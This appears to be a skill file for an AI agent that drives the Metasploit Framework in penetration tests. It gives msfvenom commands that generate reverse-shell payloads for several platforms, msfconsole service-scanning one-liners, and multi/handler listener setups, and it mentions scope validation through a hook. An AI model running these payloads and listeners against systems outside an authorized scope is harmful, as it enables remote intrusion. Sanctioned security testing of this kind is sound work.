---
name: metasploit
description: >-
  Generate payloads, scan services, and set up listeners with Metasploit.
  Reverse shells, msfvenom, auxiliary scanners, multi/handler.
disable-model-invocation: true
---

# Metasploit Framework

Generate payloads, scan services, and catch reverse shells using Metasploit (msfconsole/msfvenom).

## Tool Status

- Tool installed: !`command -v msfconsole > /dev/null 2>&1 && echo "YES -- $(grep metasploit /opt/metasploit-framework/version-manifest.txt 2>/dev/null | head -1 || msfconsole --version 2>/dev/null | head -1)" || echo "NO -- Install: https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html"`
- Wrapper scripts available: !`test -f scripts/metasploit/scan-network-services.sh && echo "YES -- use wrapper scripts for structured JSON output" || echo "NO -- using standalone mode with direct commands"`

## Mode: Wrapper Scripts Available

If wrapper scripts are available (shown as YES above), prefer these commands.
They provide structured JSON output and educational context.

### Payload Generation
- `bash scripts/metasploit/generate-reverse-shell.sh <LHOST> <LPORT> -j -x` -- Create reverse shell payloads for Linux, Windows, macOS, PHP, Python

### Service Scanning
- `bash scripts/metasploit/scan-network-services.sh <target> -j -x` -- Enumerate services using Metasploit auxiliary scanners (SMB, SSH, HTTP, MySQL)

### Listeners
- `bash scripts/metasploit/setup-listener.sh <LHOST> <LPORT> -j -x` -- Configure multi/handler to catch reverse shell connections

### Learning Mode
- `bash scripts/metasploit/examples.sh <target>` -- 10 common Metasploit patterns with explanations

Always add `-j` for JSON output and `-x` to execute (vs display-only).

## Mode: Standalone (Direct Commands)

If wrapper scripts are NOT available, use these direct msfconsole/msfvenom commands.

### Payload Generation (msfvenom)

Generate reverse shell payloads in various formats. Choose the payload matching
the target OS and the output format matching the delivery method.

- `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf` -- Linux reverse shell binary
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe` -- Windows reverse shell binary
- `msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -o shell.php` -- PHP reverse shell
- `msfvenom -p python/shell_reverse_tcp LHOST=<ip> LPORT=<port> -o shell.py` -- Python reverse shell
- `msfvenom -l payloads | grep reverse` -- List all reverse shell payloads
- `msfvenom -p linux/x64/shell_reverse_tcp --list-options` -- Show payload options

### Service Scanning (Auxiliary Modules)

Metasploit auxiliary scanners enumerate services without exploitation. Run
from msfconsole or via one-liner with -x flag for automation.

- `msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS <target>; run; exit"` -- SMB version scan
- `msfconsole -q -x "use auxiliary/scanner/ssh/ssh_version; set RHOSTS <target>; run; exit"` -- SSH version scan
- `msfconsole -q -x "use auxiliary/scanner/http/http_version; set RHOSTS <target>; run; exit"` -- HTTP server version
- `msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS <target>; set PORTS 1-1024; run; exit"` -- TCP port scan

### Listener Setup (multi/handler)

The multi/handler catches incoming reverse shell connections. Match the PAYLOAD
to whatever msfvenom generated for the target.

- `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST <ip>; set LPORT <port>; exploit"` -- Linux reverse shell listener
- `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST <ip>; set LPORT <port>; exploit"` -- Windows reverse shell listener

## Defaults

- LHOST auto-detects local IP when not provided
- LPORT defaults to `4444` when not provided
- Target defaults to `localhost` for scanning scripts

## Target Validation

All commands validate targets against `.pentest/scope.json` via the PreToolUse hook.
